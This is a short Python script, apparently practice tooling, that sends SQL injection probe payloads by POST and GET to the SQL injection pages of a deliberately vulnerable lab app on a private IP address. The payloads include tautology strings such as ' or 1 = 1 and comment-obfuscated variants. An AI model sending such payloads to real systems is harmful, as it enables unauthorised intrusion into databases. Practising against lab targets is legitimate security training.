from SQLinject.lib.core import Request
import requests

if __name__ == '__main__':
    url1 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_id.php'
    url2 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_str.php'
    payloads = ["' and 1 = 1 --", "%d and 1 = 1 ", ' or 1 = 1', '/**/and/**/1=1/**/--/**/']

    res = Request.request

    print(res.setpostdata(url1, payloads))
    print(res.setgetdata(url2, payloads))

    print(res.setpost(url1, res.setpostdata(url1, payloads)), res.setget(url2, res.setgetdata(url2, payloads)))
